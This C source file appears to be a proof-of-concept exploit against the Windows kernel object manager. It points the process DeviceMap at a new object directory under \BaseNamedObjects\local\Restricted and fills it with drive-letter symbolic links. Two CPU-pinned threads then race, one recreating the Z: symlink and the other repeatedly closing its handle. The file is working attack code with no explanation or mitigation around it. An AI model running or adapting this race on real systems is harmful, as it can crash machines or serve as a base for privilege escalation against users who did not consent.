#include "stdafx.h"
#include "time.h"
#include "Header.h"









wchar_t* pXXX = L"\\BaseNamedObjects\\local\\Restricted";
wchar_t* pZZZ = L"\\RPC Control\\";





wchar_t SymLinkName[MAX_PATH+1]={0};
_UNICODE_STRING UniSS_sl = {0};
_OBJECT_ATTRIBUTES ObjAttr_sl={0};


wchar_t Target_[0x1000]=L"targetwalied";
_UNICODE_STRING uniTarget={0};

HANDLE hSubDir = 0;
HANDLE hSymLink = 0;


ulong xCount = 0;

wchar_t Buffer[0x10];
_UNICODE_STRING uniTar = {0x2,0x4,0,Buffer};

void ThreadX0()
{
	srand(time(NULL));

	ulong PrefProc = 0;
	if(!SetThreadAffinityMask(GetCurrentThread(),(ulong)(1 << PrefProc)))
	{
		printf("Warning: Error setting affinity mask\r\n");
		return;
	}
	if(SetThreadIdealProcessor(GetCurrentThread(),PrefProc) == -1)
	{
		printf("Warning: Error setting ideal processor, Err: %X\r\n", GetLastError());
	}

	wcscpy(&SymLinkName[0],L"A:");
	wprintf(L"%s\r\n",SymLinkName);
	UniSS_sl.Length = wcslen(SymLinkName)*2;
	UniSS_sl.MaxLength = UniSS_sl.Length + 2;
	UniSS_sl.Buffer = SymLinkName;
	ObjAttr_sl.Length = sizeof(ObjAttr_sl);
	ObjAttr_sl.Attributes= OBJ_CASE_INSENSITIVE;
	ObjAttr_sl.ObjectName = & UniSS_sl;
	uniTarget.Length = wcslen(Target_)*2;
	uniTarget.MaxLength = uniTarget.Length + 2;
	uniTarget.Buffer = Target_;

	//-- Fill Device Map ----------------
	for(ulong i=0;i<26;i++)
	{
		SymLinkName[0]= L'A' + i;
		ObjAttr_sl.RootDirectory = hSubDir;
		int retValue = ZwCreateSymbolicLinkObject(&hSymLink,
												SYMBOLIC_LINK_ALL_ACCESS,
												&ObjAttr_sl,
												&uniTarget);

		
		printf("ZwCreateSymbolicLinkObject, ret: %X, hSymLink: %I64X\r\n",retValue,hSymLink);
	}

	ZwClose(hSymLink);//Close Z:
	while(1)
	{
		SymLinkName[0]= L'Z';
		ObjAttr_sl.RootDirectory = hSubDir;

		int retValue = ZwCreateSymbolicLinkObject(&hSymLink,
												SYMBOLIC_LINK_ALL_ACCESS,
												&ObjAttr_sl,
												&uniTarget);

		
		printf("ZwCreateSymbolicLinkObject, ret: %X, hSymLink: %I64X\r\n",retValue,hSymLink);

		//ZwClose(hSymLink);
	}
	return;
}


void ThreadX1()
{
	srand(time(NULL));

	ulong PrefProc = 1;
	if(!SetThreadAffinityMask(GetCurrentThread(),(ulong)(1 << PrefProc)))
	{
		printf("Warning: Error setting affinity mask\r\n");
		return;
	}
	if(SetThreadIdealProcessor(GetCurrentThread(),PrefProc) == -1)
	{
		printf("Warning: Error setting ideal processor, Err: %X\r\n", GetLastError());
	}

	Sleep(3000);
	while(1)
	{
		ZwClose(hSymLink);
	}
}


void POC_RACE_With_DeviceMap()
{
	_UNICODE_STRING UNI = {0};
	UNI.Length=wcslen(pXXX)*2;	//L"\\BaseNamedObjects\\local\\Restricted";
	UNI.MaxLength=UNI.Length+2;
	UNI.Buffer=pXXX;

	_OBJECT_ATTRIBUTES ObjAttr = {sizeof(ObjAttr)};
	ObjAttr.ObjectName=&UNI;
	ObjAttr.Attributes=OBJ_CASE_INSENSITIVE;

	HANDLE hDir = 0;
	int ret = ZwOpenDirectoryObject(&hDir,GENERIC_READ|GENERIC_WRITE,&ObjAttr);
	wprintf(L"ZwOpenDirectoryObject, ret: %X, HANDLE: %X\r\n",ret,hDir);
	if(ret < 0)
	{
		printf("Can't find parent directory object\r\n");
		return;
	}

	//-------- Create SubDir ---------
	wchar_t* wSubDir = L"waliedxxx";
	_UNICODE_STRING uniSub = {0};
	uniSub.Length = wcslen(wSubDir) * 2;
	uniSub.MaxLength = uniSub.Length + 2;
	uniSub.Buffer = wSubDir;

	_OBJECT_ATTRIBUTES objAttrSub = {0};
	objAttrSub.Length = sizeof(objAttrSub);
	objAttrSub.Attributes = OBJ_CASE_INSENSITIVE;
	objAttrSub.ObjectName = &uniSub;
	objAttrSub.RootDirectory = hDir;

	ret = ZwCreateDirectoryObjectEx(&hSubDir,GENERIC_ALL,&objAttrSub,0,0);
	//wprintf(L"ZwCreateDirectoryObjectEx, ret: %X, HANDLE: %X\r\n",ret,hSubDir);

	//----------Assign DeviceMap to the new directory object---------------
	
	int retP = ZwSetInformationProcess( GetCurrentProcess(),ProcessDeviceMap,
									&hSubDir,0x8);
	printf("ZwSetInformationProcess, ret: %X\r\n",retP);
	if(retP < 0)
	{
		return;
	}



	ulong tid0 = 0;
	HANDLE hThread0 = CreateThread(0,0xA000,(LPTHREAD_START_ROUTINE)ThreadX0,0,0,&tid0);

	
	ulong tid1 = 0;
	HANDLE hThread1 = CreateThread(0,0xA000,(LPTHREAD_START_ROUTINE)ThreadX1,0,0,&tid1);

	Sleep(-1);

}



int _tmain(int argc, _TCHAR* argv[])
{
	/*
	ulong PrefProc = 0;
	if(!SetThreadAffinityMask(GetCurrentThread(),(ulong)(1 << PrefProc)))
	{
		printf("Warning: Error setting affinity mask\r\n");
		return -1;
	}
	if(SetThreadIdealProcessor(GetCurrentThread(),PrefProc) == -1)
	{
		printf("Warning: Error setting ideal processor, Err: %X\r\n", GetLastError());
	}
	*/

	POC_RACE_With_DeviceMap();
	Sleep(-1);
	return 0;
}